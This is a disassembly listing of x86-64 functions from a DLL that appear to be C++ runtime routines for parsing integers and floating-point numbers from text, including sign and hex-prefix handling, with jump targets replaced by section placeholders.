cmove rsi r12
lea rcx [ rsp + 0x30 ]
call sub_18001778c
test rsi rsi
je r-xdata
cmp rax rdi
jae r-xdata
test edi edi
jns r-xdata
or [ r13 ] 0x1
cmp r12d 0x1
cmovbe edi r12d
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rsi + 0x8 ] rax
lea rsi [ rcx + 0x1 ]
mov rax 0x7ffffffffffffffe
cmp rsi rax
jbe r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ r12 + 0x8 ] rax
setne cl
mov rax [ rbp - 0x69 ]
mov [ rax ] cl
or [ r13 ] 0x2
jmp r-xdata
mov rdx [ rbp - 0x41 ]
cmp rdx rsi
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rcx [ r14 ]
mov [ r15 ] rcx
mov rcx [ r14 + 0x8 ]
mov [ r15 + 0x8 ] rcx
mov rax r15
mov rcx [ rbp - 0x9 ]
xor rcx rsp
call sub_180018450
add rsp 0xc8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
test rsi rsi
jne r-xdata
mov r8 rcx
mov rdx rsi
lea rcx [ rbp - 0x59 ]
call sub_1800027d0
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x49 ] rbx
lea rax [ rbp - 0x59 ]
cmp rdx 0x8
cmovae rax [ rbp - 0x59 ]
mov [ rax ] bx
mov rcx [ rbp - 0x49 ]
mov rdx [ rbp - 0x41 ]
test rsi rsi
lea rdx [ rbp - 0x31 ]
mov rcx r12
call sub_180008200
nop
mov r9 rdi
xor r8d r8d
mov rdx rax
lea rcx [ rbp - 0x59 ]
call sub_180002070
nop
cmp [ rbp - 0x19 ] 0x8
jb r-xdata
lea rax [ rbp - 0x59 ]
cmp rdx 0x8
cmovae rax [ rbp - 0x59 ]
mov [ rax + rcx * 2 ] bx
mov [ rbp - 0x49 ] rsi
lea rax [ rbp - 0x59 ]
cmp [ rbp - 0x41 ] 0x8
cmovae rax [ rbp - 0x59 ]
mov [ rax + rsi * 2 ] bx
lea r8 [ rbp - 0x59 ]
mov rsi [ rbp - 0x59 ]
mov rbx [ rbp - 0x41 ]
cmp rbx 0x8
cmovae r8 rsi
mov rdx [ rsp + 0x40 ]
mov rcx r14
call sub_180014b10
mov edi eax
cmp rbx 0x8
jb r-xdata
mov rcx [ rbp - 0x31 ]
call j_sub_180018b3c
mov rcx rsi
call j_sub_180018b3c
jmp r-xdata
sub_180011270
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x50 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_180003910
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_180012130
mov [ rsp + 0x38 ] eax
mov rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
lea rdi [ rsp + 0x59 ]
lea rax [ rsp + 0x58 ]
cmp [ rsp + 0x58 ] 0x2d
cmovne rdi rax
lea r9 [ rsp + 0x30 ]
mov r8d [ rsp + 0x38 ]
lea rdx [ rsp + 0x48 ]
mov rcx rdi
call sub_180018158
mov ebx eax
mov rdx r15
mov rcx r13
call sub_180014f30
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_18001775c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
cmp [ rsp + 0x48 ] rdi
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_18001778c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
cmp ebx 0xffff
ja r-xdata
cmp [ rsp + 0x58 ] 0x2d
jne r-xdata
mov [ r14 ] bx
jmp r-xdata
neg ebx
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_180018450
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_1800113f0
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x50 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_180003910
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_180012130
mov [ rsp + 0x38 ] eax
mov rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
lea rdi [ rsp + 0x59 ]
lea rax [ rsp + 0x58 ]
cmp [ rsp + 0x58 ] 0x2d
cmovne rdi rax
lea r9 [ rsp + 0x30 ]
mov r8d [ rsp + 0x38 ]
lea rdx [ rsp + 0x48 ]
mov rcx rdi
call sub_180018158
mov ebx eax
mov rdx r15
mov rcx r13
call sub_180014f30
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_18001775c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
cmp [ rsp + 0x48 ] rdi
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_18001778c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
cmp ebx 0xffffffff
ja r-xdata
cmp [ rsp + 0x58 ] 0x2d
jne r-xdata
mov [ r14 ] ebx
jmp r-xdata
neg ebx
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_180018450
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180011570
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_180003910
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x50 ]
mov rcx rdi
call sub_180012130
mov r8d eax
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_180017d7c
mov edi eax
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
mov rdx r15
mov rcx r13
call sub_180014f30
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_18001775c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
lea rax [ rsp + 0x50 ]
cmp [ rsp + 0x40 ] rax
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_18001778c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
mov [ r14 ] edi
jmp r-xdata
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180018450
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_1800116d0
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_180003910
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x50 ]
mov rcx rdi
call sub_180012130
mov r8d eax
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_180018158
mov edi eax
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
mov rdx r15
mov rcx r13
call sub_180014f30
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_18001775c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
lea rax [ rsp + 0x50 ]
cmp [ rsp + 0x40 ] rax
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_18001778c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
mov [ r14 ] edi
jmp r-xdata
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180018450
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180011830
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_180003910
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x50 ]
mov rcx rdi
call sub_180012130
mov r8d eax
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_180017e70
mov rdi rax
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
mov rdx r15
mov rcx r13
call sub_180014f30
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_18001775c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
lea rax [ rsp + 0x50 ]
cmp [ rsp + 0x40 ] rax
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_18001778c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
mov [ r14 ] rdi
jmp r-xdata
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180018450
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180011990
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_180003910
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x50 ]
mov rcx rdi
call sub_180012130
mov r8d eax
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_180017f64
mov rdi rax
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
mov rdx r15
mov rcx r13
call sub_180014f30
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_18001775c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
lea rax [ rsp + 0x50 ]
cmp [ rsp + 0x40 ] rax
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_18001778c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
mov [ r14 ] rdi
jmp r-xdata
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180018450
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180011af0
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0xa0
movaps [ rsp + 0x90 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov rax [ rsp + 0xf0 ]
mov rbx [ rsp + 0xf8 ]
mov rbp [ rsp + 0x100 ]
mov rdi rdx
xor edx edx
mov r12 r9
mov [ rsp + 0x30 ] edx
mov [ rsp + 0x34 ] edx
lea rdx [ rsp + 0x34 ]
mov [ rsp + 0x28 ] rdx
lea rdx [ rsp + 0x40 ]
mov rsi r8
mov [ rsp + 0x20 ] rax
call sub_180012750
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x40 ]
mov r8d eax
call sub_180017e5c
mov edx [ rsp + 0x34 ]
movaps xmm6 xmm0
test edx edx
je r-xdata
mov rdx r12
mov rcx rsi
call sub_180014f30
test al al
je r-xdata
unpcklps xmm6 xmm6
shl edx 0x2
cvtps2pd xmm0 xmm6
call sub_180018fdc
cvtsd2ss xmm6 xmm0
lea rax [ rsp + 0x40 ]
cmp [ rsp + 0x38 ] rax
je r-xdata
or [ rbx ] 0x1
or [ rbx ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
movss [ rbp ] xmm6
jmp r-xdata
mov rcx [ rsi ]
mov rax rdi
mov [ rdi ] rcx
mov rcx [ rsi + 0x8 ]
mov [ rdi + 0x8 ] rcx
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_180018450
movaps xmm6 [ rsp + 0x90 ]
add rsp 0xa0
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180011c00
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0xa0
movaps [ rsp + 0x90 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov rax [ rsp + 0xf0 ]
mov rbx [ rsp + 0xf8 ]
mov rbp [ rsp + 0x100 ]
mov rdi rdx
xor edx edx
mov r12 r9
mov [ rsp + 0x30 ] edx
mov [ rsp + 0x34 ] edx
lea rdx [ rsp + 0x34 ]
mov [ rsp + 0x28 ] rdx
lea rdx [ rsp + 0x40 ]
mov rsi r8
mov [ rsp + 0x20 ] rax
call sub_180012750
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x40 ]
mov r8d eax
call sub_180018338
mov edx [ rsp + 0x34 ]
movapd xmm6 xmm0
test edx edx
je r-xdata
mov rdx r12
mov rcx rsi
call sub_180014f30
test al al
je r-xdata
shl edx 0x2
call sub_180018fdc
movapd xmm6 xmm0
lea rax [ rsp + 0x40 ]
cmp [ rsp + 0x38 ] rax
je r-xdata
or [ rbx ] 0x1
or [ rbx ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
movsd [ rbp ] xmm6
jmp r-xdata
mov rcx [ rsi ]
mov rax rdi
mov [ rdi ] rcx
mov rcx [ rsi + 0x8 ]
mov [ rdi + 0x8 ] rcx
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_180018450
movaps xmm6 [ rsp + 0x90 ]
add rsp 0xa0
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180011d10
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0xa0
movaps [ rsp + 0x90 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov rax [ rsp + 0xf0 ]
mov rbx [ rsp + 0xf8 ]
mov rbp [ rsp + 0x100 ]
mov rdi rdx
xor edx edx
mov r12 r9
mov [ rsp + 0x30 ] edx
mov [ rsp + 0x34 ] edx
lea rdx [ rsp + 0x34 ]
mov [ rsp + 0x28 ] rdx
lea rdx [ rsp + 0x40 ]
mov rsi r8
mov [ rsp + 0x20 ] rax
call sub_180012750
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x40 ]
mov r8d eax
call j_sub_180018338
mov edx [ rsp + 0x34 ]
movapd xmm6 xmm0
test edx edx
je r-xdata
mov rdx r12
mov rcx rsi
call sub_180014f30
test al al
je r-xdata
shl edx 0x2
call sub_180018fdc
movapd xmm6 xmm0
lea rax [ rsp + 0x40 ]
cmp [ rsp + 0x38 ] rax
je r-xdata
or [ rbx ] 0x1
or [ rbx ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
movsd [ rbp ] xmm6
jmp r-xdata
mov rcx [ rsi ]
mov rax rdi
mov [ rdi ] rcx
mov rcx [ rsi + 0x8 ]
mov [ rdi + 0x8 ] rcx
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_180018450
movaps xmm6 [ rsp + 0x90 ]
add rsp 0xa0
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180011e20
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov r14 r9
mov r12 r8
mov rbp rdx
mov rbx rcx
mov rcx [ rsp + 0xf0 ]
mov rdi [ rsp + 0xf8 ]
mov r13 [ rsp + 0x100 ]
xor esi esi
mov [ rsp + 0x30 ] esi
lea rdx [ rsp + 0x38 ]
call sub_180003910
nop
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] 0x800
mov r9 r14
mov r8 r12
lea rdx [ rsp + 0x50 ]
mov rcx rbx
call sub_180012130
mov r15d eax
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
lea r9 [ rsp + 0x30 ]
mov r8d r15d
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_180017f64
mov rbx rax
mov rdx r14
mov rcx r12
call sub_180014f30
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_18001775c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
lea rax [ rsp + 0x50 ]
cmp [ rsp + 0x40 ] rax
je r-xdata
or [ rdi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rsi rbx
lea rcx [ rsp + 0x34 ]
call sub_18001778c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rdi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
mov [ r13 ] rbx
jmp r-xdata
mov rcx [ r12 ]
mov [ rbp ] rcx
mov rcx [ r12 + 0x8 ]
mov [ rbp + 0x8 ] rcx
mov rax rbp
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180018450
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180011f80
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi rdx
mov rsi rcx
mov rax 0x555555555555555
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0x2aaaaaaaaaaaaaab
mov rax r12
imul rcx
sar rdx 0x3
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor ebx ebx
mov [ rsp + 0x58 ] rbx
test rdi rdi
je r-xdata
mov r8 rbx
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_180015010
nop
mov r9 [ rsi + 0x8 ]
mov rcx [ rsi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
mov r12 rdx
sar r12 0x3
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
lea rcx [ rdi + rdi * 2 ]
shl rcx 0x4
call sub_180018a08
mov rbx rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
lea rax [ rdi + rdi * 2 ]
shl rax 0x4
add rax rbx
mov [ rsi + 0x10 ] rax
lea rax [ r12 + r12 * 2 ]
shl rax 0x4
add rax rbx
mov [ rsi + 0x8 ] rax
mov [ rsi ] rbx
mov rdx r9
call sub_1800120d0
mov rcx [ rsi ]
call j_sub_180018b3c
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_180018524
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180019410
nop
sub_1800120d0
cmp rcx rdx
je r-xdata
retn
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov rdi rdx
xor esi esi
lea rbx [ rcx + 0x20 ]
nop [ rax ] eax
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] rsi
mov [ rbx - 0x18 ] si
add rbx 0x30
lea rax [ rbx - 0x20 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_180018b3c
cmp [ rbx ] 0x8
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_180012130
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xf ]
sub rsp 0xd8
mov [ rbp - 0x59 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r13 r9
mov [ rbp - 0x61 ] r9
mov rdi r8
mov r12 rdx
mov [ rbp - 0x79 ] rdx
mov rsi rcx
mov rcx [ rbp + 0x7f ]
call sub_1800090d0
mov rbx rax
lea rdx [ rbp - 0x29 ]
mov rcx rax
call sub_1800088d0
nop
xor r14d r14d
cmp [ rbp - 0x19 ] r14
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x10 ]
mov [ rbp - 0x7d ] ax
mov [ rbp - 0x7d ] r14w
jmp r-xdata
mov eax [ rbp + 0x77 ]
and eax 0xe00
mov ecx 0x8
cmp eax 0x400
jne r-xdata
mov [ rsp + 0x30 ] 0x2b
xor eax eax
mov [ rsp + 0x3c ] ax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x44 ]
mov r8d r15d
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x3c ]
call sub_180017a9c
movzx ebx [ rsp + 0x3c ]
mov rcx rdi
call sub_1800147a0
cmp ax bx
jne r-xdata
mov [ rsp + 0x30 ] 0x30
mov [ rsp + 0x40 ] r14w
mov [ rsp + 0x44 ] r14d
add rsi 0x10
mov [ rbp - 0x69 ] rsi
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x44 ]
mov r15d 0x1
mov r8d r15d
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x40 ]
call sub_180017a9c
mov r14 r12
mov rdx r13
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov r12d ecx
jmp r-xdata
mov [ rsp + 0x30 ] 0x2d
xor eax eax
mov [ rsp + 0x3c ] ax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x44 ]
mov r8 r15
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x3c ]
call sub_180017a9c
movzx ebx [ rsp + 0x3c ]
mov rcx rdi
call sub_1800147a0
cmp ax bx
jne r-xdata
mov [ r12 ] 0x2b
jmp r-xdata
neg eax
sbb r12d r12d
and r12d 0xa
mov r12d 0x10
jmp r-xdata
mov [ rsp + 0x44 ] r12d
xor bl bl
mov [ rsp + 0x38 ] bl
mov [ rsp + 0x3c ] bl
mov rdx r13
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
mov [ r12 ] 0x2d
lea r14 [ r12 + 0x1 ]
mov rcx rdi
call sub_180014810
test r12d r12d
je r-xdata
mov rcx rdi
call sub_1800147a0
cmp ax [ rsp + 0x40 ]
jne r-xdata
mov esi 0xa
cmp r12d 0xa
je r-xdata
movzx ebx r15b
mov [ rsp + 0x38 ] bl
mov rcx rdi
call sub_180014810
mov rdx r13
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
movzx eax [ rsp + 0x38 ]
movsxd rsi esi
mov [ rbp - 0x71 ] rsi
mov eax 0x8
test r12d r12d
jne r-xdata
mov [ rsp + 0x30 ] 0x78
xor eax eax
mov [ rsp + 0x40 ] ax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x48 ]
mov r8 r15
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x40 ]
call sub_180017a9c
movzx ebx [ rsp + 0x40 ]
mov rcx rdi
call sub_1800147a0
cmp ax bx
je r-xdata
mov r14 [ rbp - 0x79 ]
test rbx rbx
je r-xdata
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x48 ] 0x0
mov r9 [ rbp - 0x69 ]
lea r8 [ rsp + 0x48 ]
movzx edx [ rdi + 0xa ]
lea rcx [ rsp + 0x30 ]
call sub_180016f50
movsx r11d [ rsp + 0x30 ]
mov [ r14 ] r11b
mov edx r11d
mov r8 rsi
lea rcx [ r--data ]
call sub_180018bf4
test rax rax
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov r12d 0xf
mov [ rbp - 0x39 ] r12
mov [ rbp - 0x51 ] bl
mov [ rbp - 0x41 ] r15
mov [ rbp - 0x50 ] 0x0
xor ebx ebx
mov rdx r13
mov rcx rdi
call sub_180014f30
mov r13 [ rbp - 0x51 ]
test al al
jne r-xdata
mov eax 0x8
mov r12d eax
mov [ rsp + 0x44 ] eax
jmp r-xdata
test r12d r12d
je r-xdata
mov [ rsp + 0x30 ] 0x58
xor eax eax
mov [ rsp + 0x40 ] ax
mov [ rsp + 0x48 ] eax
